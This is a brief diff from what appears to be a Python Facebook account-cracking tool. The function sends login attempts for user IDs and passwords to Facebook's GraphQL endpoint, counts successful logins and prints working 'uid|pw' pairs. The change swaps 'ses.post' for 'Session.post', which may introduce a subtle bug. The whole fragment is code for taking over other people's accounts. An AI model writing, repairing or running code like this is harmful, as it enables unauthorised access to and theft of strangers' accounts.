@@ -1328,7 +1328,7 @@ def mbasic(uid,pwx,tl):
                 'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
             encode = urllib.parse.urlencode(data, doseq=True)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            response = ses.post('https://graph.facebook.com/graphql', data=encode)
+            response = Session.post('https://graph.facebook.com/graphql', data=encode)
             if "session_key" in response.text and "uid" in response.text:
                 ok+=1
                 print(f" {green}(ATOM-OK) {uid}|{pw} ")
